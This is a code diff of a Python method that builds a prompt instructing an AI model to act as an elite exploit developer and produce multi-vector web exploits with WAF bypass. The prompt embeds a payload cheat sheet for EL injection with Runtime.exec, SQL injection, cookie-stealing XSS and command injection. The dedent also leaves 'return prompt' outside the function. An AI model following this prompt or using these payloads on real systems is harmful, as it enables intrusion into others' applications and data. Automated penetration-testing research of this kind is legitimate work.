@@ -1,43 +1,43 @@
-    def _build_web_logic_prompt(self, context_dict):
-        """
-        STATE-OF-THE-ART Exploit Generation Prompt
-        Incorporates: Chain-of-Thought, Few-Shot Learning, Multi-Vector Payloads, WAF Bypass
-        Based on 2024 research on LLM prompting and advanced exploitation techniques
-        """
-        language = context_dict.get("language", "Java/Python")
-        vuln_type = context_dict.get("vulnerability_type", "Unknown")
-        cwe = context_dict.get("cwe", "Unknown")
-        file_path = context_dict.get("file_path", "Unknown")
-        vulnerable_code = context_dict.get("vulnerable_chunk", "No code provided.")
-        
-        target_url = self.default_target or "http://localhost:8080"
-        
-        prompt = f"""Below is an instruction that describes a task. Write a response that appropriately completes the request.
+def _build_web_logic_prompt(self, context_dict):
+    """
+    STATE-OF-THE-ART Exploit Generation Prompt
+    Incorporates: Chain-of-Thought, Few-Shot Learning, Multi-Vector Payloads, WAF Bypass
+    Based on 2024 research on LLM prompting and advanced exploitation techniques
+    """
+    language = context_dict.get("language", "Java/Python")
+    vuln_type = context_dict.get("vulnerability_type", "Unknown")
+    cwe = context_dict.get("cwe", "Unknown")
+    file_path = context_dict.get("file_path", "Unknown")
+    vulnerable_code = context_dict.get("vulnerable_chunk", "No code provided.")
+    
+    target_url = self.default_target or "http://localhost:8080"
+    
+    prompt = f"""Below is an instruction that describes a task. Write a response that appropriately completes the request.
 
 ### Instruction:
 You are an ELITE penetration tester and exploit developer with 20+ years of offensive security experience. You specialize in creating production-ready, multi-vector exploits that demonstrate real-world attack techniques.
 
 ═══════════════════════════════════════════════════════════════════════════════
-⚠️  CRITICAL: CWE-TO-PAYLOAD MAPPING (STRICTLY ENFORCE)
+  CRITICAL: CWE-TO-PAYLOAD MAPPING (STRICTLY ENFORCE)
 ═══════════════════════════════════════════════════════════════════════════════
 
 **CWE-917 (EL Injection)**:
 ├─ Primary: `${{"...".__class__.forName("java.lang.Runtime").getRuntime().exec("cmd")}}`
 ├─ Detection: `${{7*7}}` (should return 49)
 ├─ WAF Bypass: Dynamic string construction without quotes
-└─ ❌ NEVER use path traversal (`../`) for EL Injection
+└─  NEVER use path traversal (`../`) for EL Injection
 
 **CWE-89 (SQL Injection)**:
 ├─ Union-based: `' UNION SELECT NULL, username, password FROM users--`
 ├─ Blind: `' AND IF(SUBSTRING(DB_NAME(),1,1)='A', SLEEP(5), 0)--`
 ├─ Boolean: `' AND 1=1--` vs `' AND 1=2--`
-└─ ❌ NEVER use EL syntax (`${{}}`) for SQL
+└─  NEVER use EL syntax (`${{}}`) for SQL
 
 **CWE-79 (XSS)**:
 ├─ Reflected: `<script>alert(document.cookie)</script>`
 ├─ DOM: `<img src=x onerror=alert(1)>`
 ├─ WAF Bypass: `<scr<script>ipt>alert(1)</script>`
-└─ ❌ NEVER use SQL syntax for XSS
+└─  NEVER use SQL syntax for XSS
 
 **CWE-78 (Command Injection)**:
 ├─ Basic: `; whoami`, `| id`, `&& ls`
@@ -45,7 +45,7 @@ You are an ELITE penetration tester and exploit developer with 20+ years of offe
 └─ Blind: `; sleep 5`
 
 ═══════════════════════════════════════════════════════════════════════════════
-📚 FEW-SHOT EXAMPLES (STUDY THESE CAREFULLY)
+ FEW-SHOT EXAMPLES (STUDY THESE CAREFULLY)
 ═══════════════════════════════════════════════════════════════════════════════
 
 **EXAMPLE 1: EL INJECTION (CWE-917) - The Gold Standard**
@@ -174,7 +174,7 @@ print("[*] Complete.")
 ```
 
 ═══════════════════════════════════════════════════════════════════════════════
-🎯 YOUR MISSION
+ YOUR MISSION
 ═══════════════════════════════════════════════════════════════════════════════
 
 **Context:**
@@ -190,7 +190,7 @@ print("[*] Complete.")
 ```
 
 ═══════════════════════════════════════════════════════════════════════════════
-🧠 MANDATORY ANALYSIS (THINK BEFORE CODING)
+ MANDATORY ANALYSIS (THINK BEFORE CODING)
 ═══════════════════════════════════════════════════════════════════════════════
 
 **STEP 1: CWE Analysis**
@@ -212,7 +212,7 @@ print("[*] Complete.")
 - 3-5 exploitation payloads
 
 ═══════════════════════════════════════════════════════════════════════════════
-✅ OUTPUT FORMAT
+ OUTPUT FORMAT
 ═══════════════════════════════════════════════════════════════════════════════
 
 ### Response:
@@ -245,13 +245,13 @@ print("[*] Complete.")
 ```
 
 **REMINDERS**:
-- ✅ USE `requests` (NOT pwntools)
-- ✅ MATCH payloads to CWE {cwe}
-- ✅ INCLUDE 3-5 payloads per phase
-- ✅ ADD error handling
-- ✅ USE exact parameter names
+-  USE `requests` (NOT pwntools)
+-  MATCH payloads to CWE {cwe}
+-  INCLUDE 3-5 payloads per phase
+-  ADD error handling
+-  USE exact parameter names
 
 ### Response:
 ```python
 """
-        return prompt
+return prompt
